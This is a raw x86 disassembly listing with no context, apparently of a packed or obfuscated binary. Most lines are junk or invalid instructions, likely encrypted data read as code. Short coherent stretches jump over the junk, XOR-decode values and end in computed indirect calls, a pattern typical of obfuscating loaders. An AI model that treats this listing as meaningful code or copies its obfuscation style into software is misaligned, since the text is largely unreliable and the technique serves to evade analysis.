  415f36:	aad    0x43
  415f38:	cmp    eax,0x3256416
  415f3d:	cdq    
  415f3e:	sti    
  415f3f:	mov    BYTE PTR [ebp-0x1e2bc85d],ah
  415f45:	and    BYTE PTR [edx+0x3c26eb13],ah
  415f4b:	xor    ebp,DWORD PTR [ebx]
  415f4d:	xchg   esp,eax
  415f4e:	dec    ebx
  415f4f:	or     BYTE PTR [esi-0x4a252b26],ch
  415f55:	aaa    
  415f56:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415f57:	(bad)  
  415f58:	icebp  
  415f59:	jle    0x415fad
  415f5b:	push   ebp
  415f5c:	mov    esi,0xf2d9d8bc
  415f61:	cmp    ecx,DWORD PTR [eax]
  415f63:	call   0x16c8ff8e
  415f68:	dec    edi
  415f69:	push   ebp
  415f6a:	inc    eax
  415f6b:	pop    es
  415f6c:	sub    al,0xf2
  415f6e:	push   ebx
  415f6f:	ja     0x415f01
  415f71:	gs lahf 
  415f73:	int3   
  415f74:	je     0x415f13
  415f76:	mov    ds:0x705df597,eax
  415f7b:	or     al,dl
  415f7d:	jnp    0x415f62
  415f7f:	push   esp
  415f80:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415f81:	cmp    DWORD PTR [ebp-0x42def5db],edx
  415f87:	retf   0x43c7
  415f8a:	adc    ebp,esp
  415f8c:	mov    bh,0x2f
  415f8e:	jo     0x415f47
  415f90:	jnp    0x415fe1
  415f92:	shl    BYTE PTR [edi+0x11],1
  415f95:	jne    0x415fa1
  415f97:	mov    al,0x84
  415f99:	or     edx,DWORD PTR [ebx]
  415f9b:	and    al,0xe6
  415f9d:	outs   dx,BYTE PTR ds:[esi]
  415f9e:	dec    ebx
  415f9f:	pop    ebx
  415fa0:	or     DWORD PTR [edi+edx*4-0x562c7940],ebx
  415fa7:	xchg   esp,eax
  415fa8:	int3   
  415fa9:	add    eax,0x7ef92fe1
  415fae:	mov    bl,0x20
  415fb0:	gs and eax,esp
  415fb3:	inc    edi
  415fb4:	mov    ah,0xd8
  415fb6:	inc    ecx
  415fb7:	mov    al,0x1b
  415fb9:	sbb    DWORD PTR [ecx+0x22ac5f3d],0xdda578e4
  415fc3:	sbb    ebx,DWORD PTR [edx]
  415fc5:	dec    ebp
  415fc6:	xchg   edi,eax
  415fc7:	adc    al,0x95
  415fc9:	mov    ecx,?
  415fcb:	mov    ebp,0xe5ad5116
  415fd0:	jb     0x415f65
  415fd2:	neg    BYTE PTR [eax]
  415fd4:	das    
  415fd5:	inc    ebx
  415fd6:	add    cl,BYTE PTR [edi-0x5ff32a0e]
  415fdc:	mov    dh,0xd3
  415fde:	mov    ch,0x56
  415fe0:	add    al,0x3f
  415fe2:	inc    ebx
  415fe3:	pop    ss
  415fe4:	inc    esp
  415fe5:	jbe    0x415fa1
  415fe7:	(bad)  
  415fe8:	retf   
  415fe9:	xor    eax,0x4f059a06
  415fee:	fdivr  DWORD PTR [ecx]
  415ff0:	fsincos 
  415ff2:	mov    ds:0x9ebcaf88,eax
  415ff7:	cmp    ebp,DWORD PTR [esi]
  415ff9:	xlat   BYTE PTR ds:[ebx]
  415ffa:	bswap  eax
  415ffc:	jp     0x41605e
  415ffe:	shl    DWORD PTR [ebx+0x5e],1
  416001:	xchg   DWORD PTR [ebx],ebx
  416003:	xor    cl,BYTE PTR [edx+0x3f]
  416006:	push   eax
  416007:	imul   eax,DWORD PTR [edx],0x52
  41600a:	test   ch,bh
  41600c:	loopne 0x416028
  41600e:	sub    DWORD PTR [ebx],0x6ff8bf53
  416014:	cld    
  416015:	bound  esp,QWORD PTR [ebp-0x525d4da1]
  41601b:	lods   eax,DWORD PTR ds:[esi]
  41601c:	and    al,0xdd
  41601e:	add    al,0x45
  416020:	paddsw mm0,QWORD PTR [ebp+edx*8-0x44]
  416025:	rcl    BYTE PTR [ebp+0x1311d3a7],0x44
  41602c:	pushf  
  41602d:	and    esp,ebp
  41602f:	prefetchnta BYTE PTR [ecx+0x4407bdab]
  416036:	addr16 popf 
  416038:	inc    edi
  416039:	jne    0x416040
  41603b:	fild   QWORD PTR [ecx-0x7d]
  41603e:	enter  0xf152,0x6e
  416042:	out    0xf7,eax
  416044:	fidiv  DWORD PTR [edx+0xbccfbbe]
  41604a:	ret    
  41604b:	aad    0xbe
  41604d:	aas    
  41604e:	in     al,dx
  41604f:	mov    eax,0x9d5bf28e
  416054:	ficomp WORD PTR [esi-0x4b3475ce]
  41605a:	mov    ch,0xf0
  41605c:	mov    ds:0xbe04e360,eax
  416061:	imul   ecx,DWORD PTR [ecx-0xd0b4a64],0xffffff8b
  416068:	push   ebp
  416069:	or     BYTE PTR [ebx],dh
  41606b:	ror    DWORD PTR [ebp+0x729c1084],0x32
  416072:	add    BYTE PTR [ecx+0x458b0845],cl
  416078:	call   0x3355b608
  41607d:	rol    DWORD PTR [ebx],0xc6
  416080:	imul   eax,DWORD PTR [edx]
  416083:	mov    edx,DWORD PTR [ebp-0x4]
  416086:	xor    edx,ecx
  416088:	jmp    0x41636c
  41608d:	adc    ecx,DWORD PTR [edx]
  41608f:	iret   
  416090:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416091:	aad    0x61
  416093:	jae    0x41603f
  416095:	jl     0x4160ed
  416097:	cs jge 0x41605a
  41609a:	jmp    0x707f:0x17ca66fc
  4160a1:	mov    ecx,0xf270707e
  4160a6:	inc    ebx
  4160a7:	push   edi
  4160a8:	jl     0x416059
  4160aa:	adc    eax,0xbbfbcdf8
  4160af:	push   edx
  4160b0:	pop    eax
  4160b1:	lods   al,BYTE PTR ds:[esi]
  4160b2:	push   es
  4160b3:	imul   esp,DWORD PTR [ebx+0xe81d1c6],0x765c3cf0
  4160bd:	enter  0x7ff5,0x9d
  4160c1:	daa    
  4160c2:	lock xchg DWORD PTR [ecx],ecx
  4160c5:	mov    edi,DWORD PTR [edi]
  4160c7:	mov    ch,0x9c
  4160c9:	(bad)  
  4160ca:	jns    0x416130
  4160cc:	xchg   esp,eax
  4160cd:	mov    dl,al
  4160cf:	outs   dx,DWORD PTR ds:[esi]
  4160d0:	push   edi
  4160d1:	mov    al,BYTE PTR [edi]
  4160d3:	out    dx,eax
  4160d4:	sub    al,0x66
  4160d6:	jb     0x41613b
  4160d8:	sbb    al,0x28
  4160da:	out    0xd5,eax
  4160dc:	dec    ebx
  4160dd:	adc    cl,BYTE PTR [bx]
  4160e0:	add    dl,BYTE PTR ds:0xb78f868a
  4160e6:	pop    es
  4160e7:	call   0x3f41:0x87efa7c5
  4160ee:	shl    DWORD PTR [ecx-0x42682f7b],0xcf
  4160f5:	jl     0x4160b8
  4160f7:	or     DWORD PTR [eax+ebp*8-0x2b],eax
  4160fb:	cmp    eax,0xd902f5dc
  416100:	sub    al,0xe
  416102:	and    ebx,DWORD PTR [eax+0xb]
  416105:	test   al,0xcb
  416107:	jns    0x4160ab
  416109:	add    dh,BYTE PTR [edx+edi*4]
  41610c:	cwde   
  41610d:	stos   BYTE PTR es:[edi],al
  41610e:	mov    WORD PTR [edi-0x7be8f8ee],ss
  416114:	push   es
  416115:	lods   al,BYTE PTR ds:[esi]
  416116:	ror    DWORD PTR [esi],1
  416118:	mov    al,0x3
  41611a:	into   
  41611b:	and    esp,DWORD PTR [ebx-0x65]
  41611e:	retf   0xba2
  416121:	pop    edi
  416122:	xchg   ch,ah
  416124:	dec    ecx
  416125:	sbb    esi,DWORD PTR [ecx+0x38d387c]
  41612b:	js     0x4160ed
  41612d:	push   edi
  41612e:	cmp    ah,BYTE PTR [ecx]
  416130:	push   ebx
  416131:	fwait
  416132:	sub    edx,esp
  416134:	add    al,0xe6
  416136:	sub    ebp,esp
  416138:	mov    ebx,0x2ca0cfd0
  41613d:	mov    cl,0xd5
  41613f:	sub    ecx,ebx
  416141:	leave  
  416142:	mov    cl,0x28
  416144:	fs jae 0x416139
  416147:	call   0x62c2d3ed
  41614c:	sti    
  41614d:	leave  
  41614e:	not    DWORD PTR [edi]
  416150:	mov    BYTE PTR [edi-0x7291d0f3],0x6b
  416157:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416158:	mov    ds:0x750a7b6a,eax
  41615d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41615e:	adc    BYTE PTR [eax],0xa2
  416161:	pushf  
  416162:	cmc    
  416163:	jbe    0x4161a6
  416165:	mov    eax,ds:0xaa7205c5
  41616a:	jne    0x4161a4
  41616c:	push   edx
  41616d:	scas   eax,DWORD PTR es:[edi]
  41616e:	jmp    0x4161e5
  416170:	jb     0x41613c
  416172:	out    0xb4,eax
  416174:	lods   eax,DWORD PTR ds:[esi]
  416175:	stc    
  416176:	mov    ecx,0x5e30571d
  41617b:	icebp  
  41617c:	mov    cl,0x55
  41617e:	mov    ebx,0xf4bcf284
  416183:	jo     0x4161b4
  416185:	add    esp,DWORD PTR [edi-0x3c]
  416188:	sbb    al,0xa9
  41618a:	dec    ebp
  41618b:	mov    ecx,fs
  41618d:	push   ebp
  41618e:	mov    esp,0x87c2fde0
  416193:	mov    dl,0xf
  416195:	sbb    eax,0x2c0cbf66
  41619a:	mov    cl,0x2a
  41619c:	(bad)  
  41619d:	lock ret 
  41619f:	jno    0x416189
  4161a1:	pop    ds
  4161a2:	mov    BYTE PTR [ebp-0x44179b91],dh
  4161a8:	add    eax,0xe264603
  4161ad:	cmp    DWORD PTR [edi],eax
  4161af:	mov    al,ds:0x338d14fd
  4161b4:	cmp    al,0x5c
  4161b6:	aam    0xbf
  4161b8:	cmp    dl,ah
  4161ba:	cmp    DWORD PTR [ebp-0x5bce5e5c],esi
  4161c0:	sub    eax,0x592028db
  4161c5:	xor    DWORD PTR [esi-0x6ed979da],esp
  4161cb:	xor    ch,BYTE PTR [eax+eiz*4]
  4161ce:	cmp    eax,0xc673235b
  4161d3:	je     0x4161c1
  4161d5:	mov    WORD PTR [edx-0x6],ss
  4161d8:	call   edx
  4161da:	ret    
  4161db:	and    BYTE PTR [eax+0x3402657d],ch
  4161e1:	mov    dh,bh
  4161e3:	dec    ebp
  4161e4:	and    eax,0x902342de
  4161e9:	fnsave [ebx]
  4161eb:	push   es
  4161ec:	ds cmp eax,0xd4f56d7d
  4161f2:	xchg   bh,bh
  4161f4:	test   ecx,esi
  4161f6:	add    DWORD PTR [edx],esi
  4161f8:	ret    0x5b83
  4161fb:	jecxz  0x41625d
  4161fd:	mov    bh,0x53
  4161ff:	stos   BYTE PTR es:[edi],al
  416200:	neg    esi
  416202:	jns    0x41622a
  416204:	(bad)  
  416205:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416206:	cwde   
  416207:	push   edx
  416208:	cmp    DWORD PTR [edi+eax*4-0x31],eax
  41620c:	enter  0x63b4,0x9b
  416210:	xor    DWORD PTR [edx+0x6c],edx
  416213:	mov    DWORD PTR [esi+eax*2],edx
  416216:	imul   esi,DWORD PTR [esi+0x43],0xffffffa8
  41621a:	aas    
  41621b:	pop    ebx
  41621c:	jmp    0xc24e39c6
  416221:	sub    BYTE PTR [ebx+0x72],cl
  416224:	mov    bh,0xe1
  416226:	rcr    BYTE PTR [ecx+esi*2],cl
  416229:	imul   ecx,DWORD PTR [ebx],0x58
  41622c:	push   ebp
  41622d:	sahf   
  41622e:	mov    ?,ebp
  416230:	ficom  DWORD PTR [edi-0x20]
  416233:	jnp    0x41622b
  416235:	cld    
  416236:	jmp    0x24d4a23a
  41623b:	ss ins BYTE PTR es:[edi],dx
  41623d:	sbb    al,0xb9
  41623f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416240:	sti    
  416241:	push   ds
  416242:	mov    ?,WORD PTR [ebp+0x5f]
  416245:	pop    edi
  416246:	outs   dx,DWORD PTR ds:[esi]
  416247:	cli    
  416248:	xor    ebx,DWORD PTR [edx]
  41624a:	idiv   bh
  41624c:	test   eax,0x94091e33
  416251:	adc    ebx,DWORD PTR ds:0xbf119ffd
  416257:	jnp    0x4162b3
  416259:	or     ah,BYTE PTR [esi+0x40]
  41625c:	scas   al,BYTE PTR es:[edi]
  41625d:	mov    eax,ds:0xe47ed5f
  416262:	outs   dx,DWORD PTR ds:[esi]
  416263:	cmp    edx,DWORD PTR [ebx-0xdf4e43e]
  416269:	fdiv   DWORD PTR [eax]
  41626b:	xchg   ecx,eax
  41626c:	pushf  
  41626d:	pop    es
  41626e:	dec    eax
  41626f:	push   esi
  416270:	daa    
  416271:	add    BYTE PTR [eax+ebx*2],bh
  416274:	pop    es
  416275:	test   DWORD PTR [edx*4-0x441432c4],0x51dc1289
  416280:	std    
  416281:	(bad)  
  416283:	adc    eax,0xfabf8cc3
  416288:	ja     0x416212
  41628a:	xchg   DWORD PTR [edx-0x4f4902],ebp
  416290:	mul    BYTE PTR [ebp+0x648995ae]
  416296:	pop    esp
  416297:	lods   eax,DWORD PTR ds:[esi]
  416298:	test   eax,0x686153c6
  41629d:	in     al,dx
  41629e:	(bad)  
  41629f:	stos   BYTE PTR es:[edi],al
  4162a0:	inc    edx
  4162a1:	xor    al,0x46
  4162a3:	and    DWORD PTR [ecx+0x63],ebx
  4162a6:	xchg   DWORD PTR [ebx-0x67f61db3],ecx
  4162ac:	mov    ch,0x46
  4162ae:	cdq    
  4162af:	(bad)  
  4162b0:	imul   edi,DWORD PTR [ecx-0x6363c205],0x8c2502a6
  4162ba:	mov    edi,0x58c6ae9a
  4162bf:	mov    ch,0xc6
  4162c1:	mov    eax,ds:0x5c63decc
  4162c6:	enter  0xf2ce,0x51
  4162ca:	(bad)  
  4162cb:	out    dx,al
  4162cc:	xchg   DWORD PTR [eax],esi
  4162ce:	outs   dx,BYTE PTR ds:[esi]
  4162cf:	xchg   edx,eax
  4162d0:	out    dx,al
  4162d1:	sbb    BYTE PTR [esi+ebx*8+0x621aa43b],0x5d
  4162d9:	push   esp
  4162da:	push   eax
  4162db:	fs dec ebx
  4162dd:	jae    0x416261
  4162df:	or     BYTE PTR [edi],0xc9
  4162e2:	in     eax,0x6a
  4162e4:	fcom   DWORD PTR [ecx+0x46]
  4162e7:	into   
  4162e8:	add    BYTE PTR [esi],ch
  4162ea:	shl    BYTE PTR [edi-0x464cb19f],cl
  4162f0:	and    BYTE PTR [ecx-0x3e8a626b],dl
  4162f6:	push   0xfffffff3
  4162f8:	shl    BYTE PTR [edx],0xbf
  4162fb:	push   ebp
  4162fc:	test   eax,0x96e02462
  416301:	add    al,BYTE PTR [ecx+0x789575cf]
  416307:	jp     0x4162b9
  416309:	int3   
  41630a:	jne    0x416322
  41630c:	jg     0x4162a6
  41630e:	stos   DWORD PTR es:[edi],eax
  41630f:	bound  eax,QWORD PTR [esi+0x5b]
  416312:	mov    al,ds:0xe0e86b0c
  416317:	sub    DWORD PTR [edi-0x39],esp
  41631a:	push   edx
  41631b:	jecxz  0x416397
  41631d:	xchg   DWORD PTR [edi],ebp
  41631f:	loop   0x4162ed
  416321:	sahf   
  416322:	adc    BYTE PTR [ebx-0x448577c1],0x61
  416329:	mov    ecx,0x111c4ddb
  41632e:	inc    ebx
  41632f:	mov    eax,ds:0x3204fb52
  416334:	adc    DWORD PTR [ebx+0x3a9156e6],ebp
  41633a:	int    0x9c
  41633c:	mov    bl,0xc
  41633e:	jb     0x41638d
  416340:	inc    eax
  416341:	fld    TBYTE PTR [edi-0x29c7017c]
  416347:	scas   al,BYTE PTR es:[edi]
  416348:	jge    0x41631a
  41634a:	sbb    DWORD PTR [ecx+0x7d],esi
  41634d:	push   eax
  41634e:	mov    ebp,0x9449e328
  416353:	or     eax,0x401cc8a1
  416358:	ins    BYTE PTR es:[edi],dx
  416359:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41635a:	cwde   
  41635b:	cmp    BYTE PTR [eax-0x42ca0dee],ah
  416361:	(bad)  
  416363:	stos   BYTE PTR es:[edi],al
  416364:	add    DWORD PTR [ebp-0x50],esp
  416367:	test   eax,0x97646444
  41636c:	mov    ecx,DWORD PTR [ebp+0x8]
  41636f:	lea    ecx,[edx+ecx*1+0x32729c]
  416376:	cmp    ecx,eax
  416378:	jne    0x4154a0
  41637e:	mov    ebx,esi
  416380:	jmp    0x41638a
  416385:	mov    ebx,0x32729c
  41638a:	mov    eax,DWORD PTR [ebp-0x4]
  41638d:	xor    eax,0x7510855
  416392:	add    eax,ebx
  416394:	mov    DWORD PTR [ebp-0xc],eax
  416397:	xor    ebx,ebx
  416399:	lea    eax,[ebp-0x10]
  41639c:	add    ebx,DWORD PTR [eax]
  41639e:	call   ebx
  4163a0:	xor    ebx,ebx
  4163a2:	inc    ebx
  4163a3:	cmp    DWORD PTR [ebp+0x10],ebx
  4163a6:	je     0x416f54
  4163ac:	jmp    0x416690
  4163b1:	or     al,0x9a
  4163b3:	shl    DWORD PTR [esi],1
  4163b5:	jno    0x41642c
  4163b7:	jmp    0x41636b
  4163b9:	lds    ecx,FWORD PTR ds:0x3dabc841
  4163bf:	inc    esi
  4163c0:	inc    esp
  4163c1:	adc    edx,DWORD PTR [edi+edi*2]
  4163c4:	jo     0x41637f
  4163c6:	jle    0x416438
  4163c8:	jo     0x4163a0
  4163ca:	mov    esi,0x4b07eca6
  4163cf:	mov    BYTE PTR [esi],al
  4163d1:	mov    bh,0xd0
  4163d3:	inc    edx
  4163d4:	dec    esp
  4163d5:	mov    bl,0xfe
  4163d7:	fidivr DWORD PTR [edx-0x38]
  4163da:	xchg   BYTE PTR [edx-0x25b7dc31],dh
  4163e0:	xchg   esi,eax
  4163e1:	jmp    0x4163bd
  4163e3:	lods   al,BYTE PTR ds:[esi]
  4163e4:	pop    esi
  4163e5:	icebp  
  4163e6:	(bad)  
  4163e7:	dec    ecx
  4163e8:	addr16 ror ebp,cl
  4163eb:	lods   al,BYTE PTR ds:[esi]
  4163ec:	fnstsw WORD PTR [ecx+eiz*1]
  4163ef:	lea    edi,[ecx-0x54818522]
  4163f5:	or     ecx,DWORD PTR [eax]
  4163f7:	in     eax,dx
  4163f8:	ret    
  4163f9:	add    ebp,esp
  4163fb:	pop    edi
  4163fc:	inc    eax
  4163fd:	cmp    DWORD PTR [edx],0x1cc3c607
  416403:	mov    ebx,0xac686f51
  416408:	adc    ecx,DWORD PTR [ecx]
  41640a:	mov    edx,0xd6934315
  41640f:	adc    ch,bh
  416411:	adc    ecx,0xb4a5c665
  416417:	sub    BYTE PTR [edx+0x1ba58135],dl
  41641d:	or     eax,DWORD PTR [eax]
  41641f:	dec    edx
  416420:	inc    ebp
  416421:	mov    DWORD PTR [edi],0x13a8466e
  416427:	(bad)  
  416428:	loopne 0x416445
  41642a:	xchg   esp,eax
  41642b:	out    0x11,al
  41642d:	dec    eax
  41642e:	add    BYTE PTR ds:[eax-0x6e],ch
  416432:	stos   BYTE PTR es:[edi],al
  416433:	push   ebx
  416434:	push   esp
  416435:	rcr    BYTE PTR [esp+ebp*1-0x160ec174],cl
  41643c:	pop    ecx
  41643d:	or     al,0xff
  41643f:	in     al,dx
  416440:	mov    ah,0xa5
  416442:	pop    edx
  416443:	push   ebp
  416444:	in     eax,0xf9
  416446:	mov    eax,ds:0x1219cab
  41644b:	and    al,0x12
  41644d:	mov    ds:0xeab31af8,al
  416452:	or     eax,DWORD PTR [ebp+0x68c8f732]
  416458:	fstp   DWORD PTR gs:[ebx]
  41645b:	mov    dl,0x9
  41645d:	test   al,0xea
  41645f:	cs cmp al,0x1a
  416462:	in     eax,dx
  416463:	(bad)  
  416464:	xlat   BYTE PTR ds:[ebx]
  416465:	pop    ebx
  416466:	pop    ds
  416467:	mov    BYTE PTR [edi+ebp*2-0x6e],0xc7
  41646c:	scas   eax,DWORD PTR es:[edi]
  41646d:	outs   dx,DWORD PTR ds:[esi]
  41646f:	test   BYTE PTR [ecx],bh
  416471:	aas    
  416472:	out    0xdb,eax
  416474:	jbe    0x4164d2
  416476:	(bad)  
  416477:	cmp    al,0xd5
  416479:	loope  0x4164ae
  41647b:	pop    edi
  41647c:	mov    esp,0x52124735
  416481:	and    DWORD PTR [ecx+0x23d00e7d],ebx
  416487:	dec    edi
  416488:	mov    eax,0x7ebcf67
  41648d:	iret   
  41648e:	inc    BYTE PTR [ebp-0x32d3457a]
  416494:	imul   ebx,DWORD PTR [edi],0x6f0af582
  41649a:	xchg   ebx,eax
  41649b:	inc    ebp
  41649c:	or     DWORD PTR [ebp-0x69],ecx
  41649f:	rcl    DWORD PTR [ecx+0x17],cl
  4164a2:	jbe    0x41651e
  4164a4:	icebp  
  4164a5:	xchg   ebp,eax
  4164a6:	xchg   esp,eax
  4164a7:	je     0x41643e
  4164a9:	mul    BYTE PTR [esp+edx*8]
  4164ac:	pop    edi
  4164ad:	out    0x78,al
  4164af:	jmp    0x4808:0xc5892b05
  4164b6:	fisttp DWORD PTR [edx-0x37d89061]
  4164bc:	outs   dx,BYTE PTR ds:[esi]
  4164bd:	repnz mov esp,0xb09208dd
  4164c3:	daa    
  4164c4:	das    
  4164c5:	aam    0xbb
  4164c7:	cmp    DWORD PTR [ebp+ebx*1-0x2f],0xffffff85
  4164cc:	imul   edx,DWORD PTR ds:0x30bf5cbe,0xffffff90
  4164d3:	fwait
  4164d4:	ja     0x41649a
  4164d6:	jl     0x41648e
  4164d8:	xchg   esi,eax
  4164d9:	mov    ah,0x96
  4164db:	push   edx
  4164dc:	idiv   BYTE PTR [edx+0x41]
  4164df:	cmp    al,0x38
  4164e1:	ror    edx,cl
  4164e3:	add    al,0xb6
  4164e5:	inc    eax
  4164e6:	fwait
  4164e7:	jb     0x4164dd
  4164e9:	xor    al,0x2c
  4164eb:	add    eax,0x8e5e8863
  4164f0:	lods   eax,DWORD PTR ds:[esi]
  4164f1:	xchg   esp,eax
  4164f2:	pop    edx
  4164f3:	cmp    al,0x3f
  4164f5:	mov    ds:0x2fed03eb,al
  4164fa:	sbb    ebp,DWORD PTR [ebx-0x6d]
  4164fd:	push   esp
  4164fe:	popf   
  4164ff:	out    dx,al
  416500:	dec    edi
  416501:	mov    WORD PTR [eax],es
  416503:	sbb    ecx,esp
  416505:	mov    ebp,0x20268869
  41650a:	pop    ecx
  41650b:	les    ebp,FWORD PTR [esi+0x40]
  41650e:	mov    cl,0xa4
  416510:	cld    
  416511:	add    esp,DWORD PTR [edx-0x37a7268d]
  416517:	mov    ah,0xd7
  416519:	in     eax,dx
  41651a:	xor    bl,BYTE PTR [edx]
  41651c:	out    dx,eax
  41651d:	sbb    BYTE PTR [edx+0x1c1b25cb],bl
  416523:	inc    ecx
  416524:	ins    BYTE PTR es:[edi],dx
  416525:	push   edx
  416526:	stos   DWORD PTR es:[edi],eax
  416527:	fcmovnu st,st(3)
  416529:	mov    edi,0xd1ad4d7f
  41652e:	aaa    
  41652f:	mov    al,ds:0x99ea1528
  416534:	mov    ebp,0xdf76f9c2
  416539:	xchg   ebp,eax
  41653a:	pop    esp
  41653b:	popa   
  41653c:	and    DWORD PTR [esi+0xd],esp
  41653f:	popa   
  416540:	test   eax,0x5037c8c9
  416545:	push   edx
  416546:	call   DWORD PTR [esi-0x51]
  416549:	mov    dh,0x3b
  41654b:	sub    BYTE PTR [eax],ah
  41654d:	jnp    0x416533
  41654f:	cmp    eax,0x8f47ef9d
  416554:	cmp    DWORD PTR [edi],ebx
  416556:	sbb    al,0x9e
  416558:	mov    edx,0x56cf2a48
  41655d:	retf   
  41655e:	std    
  41655f:	test   DWORD PTR [edx],esi
  416561:	adc    eax,0x60b2d8e9
  416566:	pop    es
  416567:	add    eax,DWORD PTR [edx]
  416569:	push   edx
  41656a:	cmp    BYTE PTR [edi],ah
  41656c:	daa    
  41656d:	mov    eax,0x23a5376c
  416572:	data16 in al,dx
  416574:	repz mov al,0xc2
  416577:	xchg   ebx,eax
  416578:	mov    dl,0x64
  41657a:	mov    edx,0x1be059f9
  41657f:	(bad)  
  416580:	aaa    
  416581:	cmp    al,0x43
  416583:	adc    eax,0x2b52112b
  416588:	les    esi,FWORD PTR [ebx+0x0]
  41658b:	inc    ecx
  41658c:	dec    eax
  41658d:	test   al,0x3
  41658f:	xchg   ecx,eax
  416590:	cs out 0x81,eax
  416593:	sahf   
  416594:	test   al,0x45
  416596:	mov    bh,0x50
  416598:	rol    edx,cl
  41659a:	rcr    DWORD PTR [ecx-0x64f95963],cl
  4165a0:	cli    
  4165a1:	shl    ebp,1
  4165a3:	lods   eax,DWORD PTR ds:[esi]
  4165a4:	sbb    edi,DWORD PTR [edi+0x35]
  4165a7:	ss aas 
  4165a9:	pop    eax
  4165aa:	sbb    dh,bl
  4165ac:	outs   dx,BYTE PTR ds:[esi]
  4165ad:	jae    0x4165c7
  4165af:	jmp    0x4165f4
  4165b1:	call   0xf7e9:0x2ec668c0
  4165b8:	ins    DWORD PTR es:[edi],dx
  4165b9:	pushf  
  4165ba:	pop    ebx
  4165bb:	sub    edi,DWORD PTR [esi]
  4165bd:	add    ch,cl
  4165bf:	jo     0x416627
  4165c1:	arpl   WORD PTR ds:0x15143e9f,di
  4165c7:	xor    BYTE PTR [eax-0x4c8bd733],0xde
  4165ce:	ss push ecx
  4165d0:	inc    esp
  4165d1:	ffree  st(3)
  4165d3:	xchg   esp,eax
  4165d4:	xchg   ebx,ebp
  4165d6:	mov    eax,ds:0xd9b3ad90
  4165db:	jecxz  0x416615
  4165dd:	or     eax,0x4b9190cf
  4165e2:	inc    ecx
  4165e3:	retf   0x7c03
  4165e6:	nop
  4165e7:	fwait
  4165e8:	jmp    0x4165c6
  4165ea:	rcl    al,0xc6
  4165ed:	sbb    bh,BYTE PTR [eax+0x2c869b60]
  4165f3:	add    DWORD PTR ds:0x5f99be30,edx
  4165f9:	lds    edx,FWORD PTR [ecx+0x3f]
  4165fc:	fstp   TBYTE PTR [eax]
  4165fe:	retf   0xdce6
  416601:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416602:	std    
  416603:	sub    DWORD PTR [esi],ebx
  416605:	int    0x29
  416607:	inc    ebp
  416608:	cmc    
  416609:	push   0x41
  41660b:	inc    edx
  41660c:	jle    0x4165ca
  41660e:	or     BYTE PTR [ecx+0x5f],bh
  416611:	push   edx
  416612:	ror    ebx,1
  416614:	mov    esp,0x8fc6caab
  416619:	fild   WORD PTR [edi]
  41661b:	aam    0xd5
  41661d:	sub    BYTE PTR [ebx+eiz*4-0xd],cl
  416621:	jle    0x416654
  416623:	jae    0x416659
  416625:	pop    edi
  416626:	mov    bh,0xbb
  416628:	in     al,0x83
  41662a:	dec    edi
  41662b:	dec    edi
  41662c:	push   ds
  41662d:	fdiv   QWORD PTR [edx]
  41662f:	and    al,BYTE PTR [ebx]
  416631:	cli    
  416632:	or     edi,DWORD PTR [ebp+0x18]
  416635:	lods   eax,DWORD PTR ds:[esi]
  416636:	out    0x1d,eax
  416638:	pop    edi
  416639:	mov    edi,0xd0a7b884
  41663e:	sub    ebx,DWORD PTR [edx]
  416640:	lahf   
  416641:	cld    
  416642:	add    al,0xcc
  416644:	mov    esi,0xd5aeb21
  416649:	push   es
  41664a:	(bad)  
  41664b:	jae    0x41664a
  41664d:	shl    BYTE PTR [edi],cl
  41664f:	fbld   TBYTE PTR [esi-0x5f]
  416652:	pop    edx
  416653:	int    0xfc
  416655:	sbb    dl,BYTE PTR [ecx-0x3347c30f]
  41665b:	push   eax
  41665c:	adc    DWORD PTR [edx-0x6bf9e911],esp
  416662:	out    dx,eax
  416663:	dec    ecx
  416664:	and    eax,0xc790a864
  416669:	dec    ebp
  41666a:	or     esp,DWORD PTR [ebx-0x39]
  41666d:	sbb    DWORD PTR [eax-0x6947124e],esp
  416673:	sahf   
  416674:	inc    esp
  416675:	fldcw  WORD PTR [ebx]
  416677:	test   DWORD PTR [eax+edi*8],ecx
  41667a:	xchg   esp,eax
  41667b:	clc    
  41667c:	push   cs
  41667d:	sti    
  41667e:	sub    al,0x4c
  416680:	fs pop ebp
  416682:	mov    bl,0x22
  416684:	ds sbb esp,edi
  416687:	mov    ecx,0xa53bc4cc
  41668c:	test   eax,0x92f9eb2f
  416691:	push   0xa
  416693:	pop    ecx
  416694:	push   0x4
  416696:	pop    ebx
  416697:	inc    ebx
  416698:	xchg   ebx,ecx
  41669a:	sub    ebx,ecx
  41669c:	jmp    0x416980
  4166a1:	cmc    
  4166a2:	icebp  
  4166a3:	retf   
  4166a4:	mov    ebp,0x717165cb
  4166a9:	test   BYTE PTR [ebx-0x79],dl
  4166ac:	jnp    0x416683
  4166ae:	add    eax,DWORD PTR [esi+edi*4]
  4166b1:	pop    esp
  4166b2:	adc    bh,BYTE PTR [edi+0x70]
  4166b5:	mov    ecx,0x6e70707e
  4166ba:	jae    0x4166a2
  4166bc:	push   0xfffffffa
  4166be:	push   0x62
  4166c0:	dec    eax
  4166c1:	push   edx
  4166c2:	pop    edx
  4166c3:	push   edi
  4166c4:	dec    edx
  4166c5:	inc    ecx
  4166c6:	mov    bh,0x10
  4166c8:	adc    BYTE PTR [ebx-0x3d96b21e],cl
  4166ce:	and    BYTE PTR [esi],0xdd
  4166d1:	xor    al,0xe3
  4166d3:	popf   
  4166d4:	call   DWORD PTR [eax]
  4166d6:	xchg   DWORD PTR [ecx+0x5],edi
  4166d9:	mov    al,0x3f
  4166db:	pop    es
  4166dc:	xor    esi,DWORD PTR [ebx]
  4166de:	xchg   edi,eax
  4166df:	or     DWORD PTR [edi+0x41],ecx
  4166e2:	ins    BYTE PTR es:[edi],dx
  4166e3:	(bad)  
  4166e4:	push   eax
  4166e5:	and    ecx,ebx
  4166e7:	fwait
  4166e8:	jle    0x4166f8
  4166ea:	out    dx,eax
  4166eb:	xor    eax,0x19bc6ee5
  4166f0:	test   DWORD PTR [edi+0x41363487],edi
  4166f6:	push   ebp
  4166f7:	sub    dl,BYTE PTR es:[edi]
  4166fa:	mov    al,0xae
